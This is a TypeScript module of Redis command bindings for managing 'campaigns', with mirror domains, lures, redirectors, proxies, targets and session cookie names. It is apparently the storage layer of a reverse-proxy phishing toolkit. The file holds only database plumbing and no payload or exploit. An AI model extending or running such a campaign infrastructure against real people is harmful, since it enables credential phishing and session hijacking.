import { CommandParser } from '@redis/client'
import {
  campaignIndexKey,
  campaignKey,
  campaignLockKey,
  campaignMirrorDomainsKey,
  campaignSessionCookieNamesKey,
  lureIndexKey,
  proxyIndexKey,
  redirectorIndexKey,
  targetIndexKey,
} from '../../database.keys.js'

/**
 * @category Campaign
 * @internal
 */
export interface RawCampaign {
  campaign_id: string
  mirror_domain: string
  is_locked: number
  session_count: number
  message_count: number
  created_at: number
}

/**
 * @category Campaign
 * @internal
 */
export interface RawFullCampaign extends RawCampaign {
  description: string
  crypt_secret: string
  upgrade_session_path: string
  session_cookie_name: string
  session_expire: number
  new_session_expire: number
  message_expire: number
  proxy_count: number
  target_count: number
  redirector_count: number
  lure_count: number
}

/**
 * @category Campaign
 * @internal
 */
export const campaignFunctions = {
  campaign: {
    create_campaign: {
      NUMBER_OF_KEYS: 4,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        mirrorDomain: string,
        description: string,
        cryptSecret: string,
        upgradeSessionPath: string,
        sessionCookieName: string,
        sessionExpire: string,
        newSessionExpire: string,
        messageExpire: string,
        createdAt: string
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignMirrorDomainsKey(prefix))
        parser.pushKey(campaignSessionCookieNamesKey(prefix))
        parser.pushKey(campaignIndexKey(prefix))

        parser.push(campaignId)
        parser.push(mirrorDomain)
        parser.push(description)
        parser.push(cryptSecret)
        parser.push(upgradeSessionPath)
        parser.push(sessionCookieName)
        parser.push(sessionExpire)
        parser.push(newSessionExpire)
        parser.push(messageExpire)
        parser.push(createdAt)
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_full_campaign: {
      NUMBER_OF_KEYS: 6,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))
        parser.pushKey(proxyIndexKey(prefix, campaignId))
        parser.pushKey(targetIndexKey(prefix, campaignId))
        parser.pushKey(redirectorIndexKey(prefix, campaignId))
        parser.pushKey(lureIndexKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_campaign_mirror_domains: {
      NUMBER_OF_KEYS: 1,

      parseCommand(parser: CommandParser, prefix: string) {
        parser.pushKey(campaignMirrorDomainsKey(prefix))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_campaign_session_cookie_names: {
      NUMBER_OF_KEYS: 1,

      parseCommand(parser: CommandParser, prefix: string) {
        parser.pushKey(campaignSessionCookieNamesKey(prefix))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_campaign_index: {
      NUMBER_OF_KEYS: 1,

      parseCommand(parser: CommandParser, prefix: string) {
        parser.pushKey(campaignIndexKey(prefix))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    lock_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        lockSecret: string,
        lockTimeout: string
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))

        parser.push(lockSecret)
        parser.push(lockTimeout)
      },

      transformReply: undefined as unknown as () => unknown,
    },

    unlock_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string, lockSecret: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))

        parser.push(lockSecret)
      },

      transformReply: undefined as unknown as () => unknown,
    },

    update_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        description: string | null,
        sessionExpire: string | null,
        newSessionExpire: string | null,
        messageExpire: string | null,
        lockSecret: string
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))

        if (description != null) {
          parser.push('description')
          parser.push(description)
        }

        if (sessionExpire != null) {
          parser.push('session_expire')
          parser.push(sessionExpire)
        }

        if (newSessionExpire != null) {
          parser.push('new_session_expire')
          parser.push(newSessionExpire)
        }

        if (messageExpire != null) {
          parser.push('message_expire')
          parser.push(messageExpire)
        }

        parser.push(lockSecret)
      },

      transformReply: undefined as unknown as () => unknown,
    },

    delete_campaign: {
      NUMBER_OF_KEYS: 9,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string, lockSecret: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))
        parser.pushKey(campaignMirrorDomainsKey(prefix))
        parser.pushKey(campaignSessionCookieNamesKey(prefix))
        parser.pushKey(campaignIndexKey(prefix))
        parser.pushKey(proxyIndexKey(prefix, campaignId))
        parser.pushKey(targetIndexKey(prefix, campaignId))
        parser.pushKey(redirectorIndexKey(prefix, campaignId))
        parser.pushKey(lureIndexKey(prefix, campaignId))

        parser.push(lockSecret)
      },

      transformReply: undefined as unknown as () => unknown,
    },
  },
} as const
